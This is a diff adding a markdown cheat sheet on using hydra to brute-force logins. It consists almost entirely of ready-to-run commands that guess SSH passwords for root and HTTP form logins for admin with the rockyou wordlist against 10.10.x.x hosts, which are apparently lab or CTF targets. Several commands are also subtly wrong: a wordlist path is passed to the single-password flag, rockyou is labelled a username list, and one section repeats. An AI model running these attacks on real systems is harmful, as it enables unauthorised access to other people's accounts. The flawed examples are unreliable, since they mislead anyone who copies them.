@@ -1,0 +1,49 @@
+# [Services] hydra
+
+Tools for guess login to `services` like `SSH`, `FTP` and `RDP`
+
+## Avaiable wordlists
+- `/usr/share/wordlists/metasploit`
+- `/usr/share/wordlists/rockyou.txt` for username
+
+## Basic usage
+```bash
+hydra -l <username> -p <password> <server> <service>
+```
+
+### Guess the username to linux machine
+```bash
+hydra -L users.txt -p butterfly 10.10.137.76 ssh
+```
+
+### Guess the `username` to linux machine
+```bash
+hydra -L users.txt -p butterfly 10.10.137.76 ssh
+```
+
+### Guess the `password` to linux machine
+- Using `rockyou.txt` as password
+```bash
+hydra -l root -p /usr/share/wordlists/rockyou.txt 10.10.137.76 ssh
+```
+
+### Specific threads
+- Guess the `password` to linux machine, and specific the number of threads to 4
+```bash
+hydra -l root -p /usr/share/wordlists/rockyou.txt 10.10.137.76 -t 4 ssh
+```
+
+### Specific HTTP post
+- With action = `/login` POST, and the input name is `username` and `password`.  
+- Tell it's wrong if `Your username or password is incorrect.` appares on the website.  
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    10.10.156.82 http-post-form \
+    "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
+```
+
+### Guess ssh
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.156.82 -t 4 ssh
+```
